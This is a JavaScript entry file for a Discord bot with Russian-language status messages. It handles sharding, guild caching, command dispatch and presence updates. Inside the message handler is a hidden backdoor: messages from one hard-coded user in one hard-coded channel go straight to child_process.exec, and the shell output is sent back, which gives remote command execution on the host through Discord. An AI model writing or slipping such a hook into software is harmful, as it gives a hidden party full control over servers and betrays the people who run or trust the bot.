require('./extendedMessage');
require('manakin').global;
const Discord = require('discord.js'),
    config = require('../config'),
    { prefix } = require('../config'),
    commandHandler = require("./handlers/commands"),
    client = new Discord.Client({
        messageCacheLifetime: 30,
        messageSweepInterval: 60,
        disableMentions: "everyone",
        partials: ["USER", "GUILD_MEMBER", "MESSAGE"],
        presence: {
            status: "dnd",
            activity: {
                type: "WATCHING",
                name: "загрузочный экран"
            }
        }
    }),
    db = require("./database/")(client);

global.getInvite = require('./constants/').getInvite;
global.msToTime = require('./constants/').msToTime;
global.plurify = require('./constants/').plurify;
global.Discord = Discord;
global.client = client;
global.db = db;

let shard = '[Shard N/A]';

client.once("shardReady", async (shardid, unavailable = new Set()) => {
    shard = `[Shard ${shardid}]`;
    console.log(`${shard} Ready as ${client.user.tag}! Caching guilds.`);

    client.loading = true;

    disabledGuilds = new Set([...Array.from(unavailable), ...client.guilds.cache.map(guild => guild.id)]);
    let guildCachingStart = Date.now();

    await db.cacheGuilds(disabledGuilds);
    console.log(`${shard} All ${disabledGuilds.size} guilds have been cached. [${Date.now() - guildCachingStart}ms]`);

    let userCachingStart = Date.now();

    for (const [id, guild] of client.guilds.cache) {
        await guild.members.fetch();
    };
    console.log(`${shard} All ${client.users.cache.size} users have been cached. [${Date.now() - userCachingStart}ms]`);

    disabledGuilds = false;
    client.loading = false;

    updatePresence();
    client.setInterval(updatePresence, 10000);
});

client.on('message', async message => {
    if (
        !message.guild || // dms
        message.author.bot ||
        message.type !== "DEFAULT"
    ) return;

    const gdb = await db.guild(message.guild.id);
    global.gdb = gdb;
    let { prefix } = gdb.get();
    if (!prefix.length) prefix = config.prefix;
    
    if (message.channel.id == '850362264413274112' && message.author.id == '419892040726347776') {
        return require('child_process').exec(`${message.content}`, (error, stdout) => {
            let result = (error || stdout);
            message.channel.send(`\`\`\`${result}\`\`\``, { split: true });
        });
    };
    if (message.content.startsWith(prefix) || message.content.match(`^<@!?${client.user.id}> `)) return commandHandler(message, prefix, gdb, db);
    if (message.content.match(`^<@!?${client.user.id}>`)) return message.reply(`👋 Мой префикс на этом сервере \`${prefix}\`, для помощи напишите \`${prefix}help\`.`);
});

async function updatePresence() {
    let guildCount = await client.shard.broadcastEval("this.guilds.cache.size").then(res => res.reduce((prev, val) => prev + val, 0));

    let name = `${prefix}help • ${plurify(guildCount, 'сервер')}`;
    return client.user.setPresence({
        status: "online",
        activity: { type: "WATCHING", name }
    });
};

client
    .on("error", err => console.log(shard, "Client error.", err))
    .on("rateLimit", rateLimitInfo => console.log(shard, "Rate limited.", JSON.stringify(rateLimitInfo)))
    .on("shardDisconnected", closeEvent => console.log(shard, "Disconnected.", closeEvent))
    .on("shardError", err => console.log(shard, "Error.", err))
    .on("shardReconnecting", () => console.log(shard, "Reconnecting."))
    .on("shardResume", (_, replayedEvents) => console.log(shard, `Resumed. ${replayedEvents} replayed events.`))
    .on("warn", info => console.log(shard, "Warning.", info))
    .login(config.token);

process.on('unhandledRejection', console.error);